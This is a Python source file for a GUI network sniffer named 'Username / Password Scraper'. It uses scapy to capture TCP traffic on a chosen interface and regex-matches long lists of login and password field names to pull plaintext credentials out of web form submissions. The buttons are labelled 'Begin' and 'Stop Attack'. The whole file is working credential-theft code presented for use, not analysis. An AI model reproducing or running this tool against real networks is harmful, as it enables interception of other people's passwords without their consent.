#!/usr/bin/python3
from tkinter import *
import paramiko, sys, os, termcolor
import threading, time
from scapy.all import *
from scapy.layers.inet import TCP, IP
from urllib import parse
import re
from concurrent import futures

thread_pool_executor = futures.ThreadPoolExecutor(max_workers=1)

def tk_after(target):
 
    @functools.wraps(target)
    def wrapper(self, *args, **kwargs):
        args = (self,) + args
        frame.after(0, target, *args, **kwargs)
 
    return wrapper

def submit_to_pool_executor(executor):
    '''Decorates a method to be sumbited to the passed in executor'''
    def decorator(target):
 
        @functools.wraps(target)
        def wrapper(*args, **kwargs):
            result = executor.submit(target, *args, **kwargs)
            result.add_done_callback(executor_done_call_back)
            return result
 
        return wrapper
 
    return decorator

def executor_done_call_back(future):
    exception = future.exception()
    if exception:
        raise exception

stop_flag = True
count = 0
message = ""
iface = ""

frame = Tk()

frame.title("Username / Password Scraper")
frame.geometry('600x400')

targetlbl = Label(frame, text='Enter the Target Network Interface: ')
targetlbl.grid(column=0, row=2)
targettxt = Entry(frame, width=20)
targettxt.grid(column=1, row=2)

output = Text(frame, wrap=WORD, width=30, height=15)
output.grid(column=0, row=6)

def get_login_pass(body):

    user = None
    passwd = None

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&\']+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^&\']+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()

    if user and passwd:
        return(user,passwd)


def pkt_parser(packet):
    global message
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            message = (parse.unquote(user_pass[0]))
            output.insert(END, message+"\n")
            output.update()
            message = (parse.unquote(user_pass[1]))
            output.insert(END, message+"\n")
            output.update()
    else:
          pass

def stopfilter(x):
    global stop_flag
    return not stop_flag

def clicked():
    try:
        global iface, stop_flag
        iface = targettxt.get()
        sniff(iface=iface, prn=pkt_parser, store=0, stop_filter=stopfilter)
    except KeyboardInterrupt:
        exit(0)

submit = Button(frame, text='Place holder')

@tk_after
def set_button_text(new_text=''):
    submit.configure(text = new_text)
 
@tk_after
def set_button_state(enable=True):
    new_state = 'normal' if enable else 'disable'
    submit.configure(state = new_state)

def on_button():
    global stop_flag
    if not stop_flag:
        stop_flag = True
        begin_attack()
        set_button_text('Stop Attack')
    else:
        stop_flag = False
        set_button_state(False)
        set_button_text('Stopping')
        stop_attack()

@submit_to_pool_executor(thread_pool_executor)
def stop_attack():
    set_button_state(True)
    set_button_text('Begin')

@submit_to_pool_executor(thread_pool_executor)
def begin_attack():
    global stop_flag
    try:
        clicked()
    except KeyboardInterrupt:
        stop_flag = False

submit = Button(frame, text='Begin', command=on_button)
submit.grid(column=2, row=4)

frame.mainloop()
